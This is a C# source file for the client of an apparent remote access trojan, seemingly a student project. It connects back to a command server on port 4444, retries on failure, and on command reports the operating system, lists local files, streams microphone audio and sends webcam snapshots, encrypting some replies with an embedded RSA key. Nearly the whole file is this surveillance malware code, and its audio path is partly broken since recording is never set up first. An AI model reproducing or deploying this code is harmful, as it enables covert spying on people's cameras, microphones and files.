using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using NAudio.Wave;
using System.Security.Cryptography;
using OpenCvSharp;
using OpenCvSharp.Extensions;


class Program
{
    static TcpClient client;
    static StreamReader reader;
    static StreamWriter writer;
    static WaveInEvent audioInput;
    static VideoCapture camera;

    static void Main(string[] args)
    {



        while (true)
        {
            try
            {
                bool isConnected = false;

                while (!isConnected)
                {
                    // Attempt to connect to the server.
                    string serverIP = "127.0.0.1"; // Replace with the server's IP address
                    int serverPort = 4444; // Replace with the server's port number

                    try
                    {
                        client = new TcpClient(serverIP, serverPort);
                        NetworkStream stream = client.GetStream();
                        reader = new StreamReader(stream);
                        writer = new StreamWriter(stream);
                        writer.AutoFlush = true;

                      

                        Console.WriteLine("Welcome To the Iqra University");
                        isConnected = true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error: " + ex.Message);
                        // Sleep for a while before attempting to reconnect.
                        Thread.Sleep(5000); // You can adjust the delay as needed.
                    }
                }

                while (isConnected)
                {
                    string data = reader.ReadLine();
                    if (data != null)
                    {
                        string cmd = data.Trim();

                        if (cmd == "tell os")
                        {
                            string osInfo = Environment.OSVersion.Platform.ToString();
                            // Encrypt the data with the server's public key before sending
                            string encryptedData = EncryptWithServerPublicKey(osInfo);
                            writer.WriteLine(encryptedData);
                        }
                        else if (cmd == "listclientfiles")
                        {
                            string clientFiles = ListClientFiles();
                            // Encrypt the data with the server's public key before sending
                            string encryptedData = EncryptWithServerPublicKey(clientFiles);
                            writer.WriteLine(encryptedData);
                        }
                        else if (cmd == "sendaudio")
                        {
                            SendAudioToServer();
                        }
                        else if (cmd == "sendimage")
                        {
                            CaptureAndSendImage();
                        }
                        else if(cmd == "SetupCameraCapture")
                        {
                            SetupCameraCapture();
                        }
                        // Handle other commands and responses here
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Client error: " + ex.Message);
            }

            // Sleep for a while before attempting to reconnect.
            Thread.Sleep(5000); // You can adjust the delay as needed.
        }
    }

    static string ListClientFiles()
    {
        string clientDirectory = Environment.CurrentDirectory;
        string[] files = Directory.GetFiles(clientDirectory);
        return string.Join(Environment.NewLine, files);
    }

    static void SetupAudioCapture()
    {
        audioInput = new WaveInEvent();
        audioInput.DataAvailable += AudioInputDataAvailable;
        audioInput.StartRecording();
    }

    static void AudioInputDataAvailable(object sender, WaveInEventArgs e)
    {
        // Send audio data to the server
        byte[] audioBytes = e.Buffer;
        client.GetStream().Write(audioBytes, 0, audioBytes.Length);
    }

    static void SetupCameraCapture()
    {
        camera = new VideoCapture(0); // 0 indicates the default camera (you can change this number if you have multiple cameras)
    }

    static void CaptureAndSendImage()
    {
        Mat frame = new Mat();
        camera.Read(frame);

        using (var ms = new MemoryStream())
        {
            frame.ToBitmap().Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
            byte[] imageBytes = ms.ToArray();

            try
            {
                client.GetStream().Write(imageBytes, 0, imageBytes.Length);
                Console.WriteLine("Image sent to the server.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending image to server: " + ex.Message);
            }
        }
    }







    static void SendAudioToServer()
    {
        const int bufferSize = 1024; // Adjust the buffer size as needed
        byte[] buffer = new byte[bufferSize];

        Console.WriteLine("Sending audio to server...");

        try
        {
            using (NetworkStream audioStream = client.GetStream())
            {
                BufferedWaveProvider bufferedWaveProvider = new BufferedWaveProvider(audioInput.WaveFormat);

                // Start recording audio
                audioInput.DataAvailable += (sender, e) =>
                {
                    // Add audio data to the buffer
                    bufferedWaveProvider.AddSamples(e.Buffer, 0, e.BytesRecorded);
                };

                audioInput.StartRecording();

                while (client.Connected)
                {
                    // Read audio data from the buffer and send it to the server
                    int bytesRead = bufferedWaveProvider.Read(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        audioStream.Write(buffer, 0, bytesRead);
                    }
                }

                // Stop recording when finished
                audioInput.StopRecording();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error sending audio to server: " + ex.Message);
        }
    }

    // Encrypt data with the server's public key
    static string EncryptWithServerPublicKey(string dataToEncrypt)
    {
        using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
        {
            string serverPublicKey = "<RSAKeyValue><Modulus>sC+FatwOT7kV62T/nMqrdh/6FdDgkY6ATfg75V1bWSgptBDE3yQ3Qhhl5o4fzL3iKGWhuqYwu/wnvw+cGIjtqq6Y/aVaTs9d6irAmimzRh/75pZaPYY4tsxE+gBqlthVwfHj7pH0RxmszuF3zP+BkzZ3KqnsvRItu+wzPy2HKlb1BtwX0gmRzaDXiWOMZeAZeanh1RjbKX8+YnmasLi6BGBB2mneGjecjEh4Rgwk7fmDme/+u0AbqY5o9Fiwz4pHISpEmZ5DRBtPHaB/Zs1rtGmtTYrZN6EqoWMFT+wViPogOW9hg2TC6+WANcPqY28aQkCCpPu+s7G3GtdTzlM0NQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
            rsa.FromXmlString(serverPublicKey); // Load the server's public key
            byte[] encryptedData = rsa.Encrypt(Encoding.UTF8.GetBytes(dataToEncrypt), false);
            return Convert.ToBase64String(encryptedData);
        }
    }
}
